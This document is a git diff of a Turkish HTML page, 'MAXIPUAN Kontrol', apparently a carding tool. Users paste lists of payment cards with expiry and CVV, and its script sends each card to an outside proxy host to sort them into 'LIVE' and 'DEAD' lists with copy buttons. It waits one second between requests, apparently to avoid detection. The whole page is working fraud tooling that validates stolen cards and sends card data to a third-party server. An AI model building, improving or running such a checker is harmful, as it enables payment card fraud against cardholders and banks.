@@ -1,54 +1,93 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <title>MaxiPuan Kontrol</title>
-    <style>
-        body {
-            background-color: #111;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
-        }
-        textarea, button {
-            width: 100%;
-            margin-top: 10px;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 14px;
-            background: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
-        }
-        #sonuclar {
-            white-space: pre-wrap;
-            margin-top: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>MAXIPUAN Kontrol</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #eee;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    textarea {
+      width: 90%;
+      height: 150px;
+      margin-bottom: 10px;
+      background: #222;
+      color: #0f0;
+      border: 1px solid #555;
+      padding: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 5px;
+      cursor: pointer;
+      background-color: #444;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    #live, #dead {
+      white-space: pre-wrap;
+      margin-top: 10px;
+      text-align: left;
+      width: 90%;
+      margin: auto;
+      background-color: #1a1a1a;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 5px;
+    }
+  </style>
 </head>
 <body>
-    <h2>💳 MaxiPuan Kart Kontrol - @HzQuarex</h2>
-    <textarea id="kartlar" rows="10" placeholder="4543592092725383|05|2027|000"></textarea>
-    <button onclick="kontrolEt()">Kontrol Et</button>
+  <h1>💳 MAXIPUAN KONTROL</h1>
+  <textarea id="cards" placeholder="Kartları buraya yaz: 4543xxxxxxxxxxxx|05|2027|000"></textarea><br>
+  <button onclick="start()">Kontrol Et</button>
+  <button onclick="copy('live')">✅ LIVE Kopyala</button>
+  <button onclick="copy('dead')">❌ DEAD Kopyala</button>
 
-    <div id="sonuclar"></div>
+  <h2>✅ LIVE</h2>
+  <div id="live"></div>
 
-    <script>
-        async function kontrolEt() {
-            const kartlar = document.getElementById("kartlar").value.trim().split("\n");
-            const sonuclar = document.getElementById("sonuclar");
-            sonuclar.innerHTML = "🔄 Kartlar kontrol ediliyor...\n";
+  <h2>❌ DEAD</h2>
+  <div id="dead"></div>
 
-            for (const kart of kartlar) {
-                try {
-                    const res = await fetch(`/proxy.php?card=${encodeURIComponent(kart.trim())}`);
-                    const text = await res.text();
-                    sonuclar.innerHTML += text + "\n";
-                } catch (e) {
-                    sonuclar.innerHTML += `❌ HATA => ${kart}\n`;
-                }
-            }
+  <script>
+    async function start() {
+      const cards = document.getElementById('cards').value.trim().split('\n');
+      document.getElementById('live').textContent = '';
+      document.getElementById('dead').textContent = '';
+
+      for (let card of cards) {
+        if (!card) continue;
+
+        try {
+          const res = await fetch(`https://hzquarex-fa1j.onrender.com/proxy?card=${encodeURIComponent(card)}`);
+          const text = await res.text();
+
+          if (text.includes('✅')) {
+            document.getElementById('live').textContent += text + '\n';
+          } else {
+            document.getElementById('dead').textContent += text + '\n';
+          }
+        } catch (e) {
+          document.getElementById('dead').textContent += `❌ ${card} => HATA\n`;
         }
-    </script>
+
+        await new Promise(r => setTimeout(r, 1000)); // istekler arasında 1 sn bekle
+      }
+    }
+
+    function copy(id) {
+      const content = document.getElementById(id).textContent;
+      navigator.clipboard.writeText(content).then(() => {
+        alert(`${id.toUpperCase()} kopyalandı`);
+      });
+    }
+  </script>
 </body>
 </html>
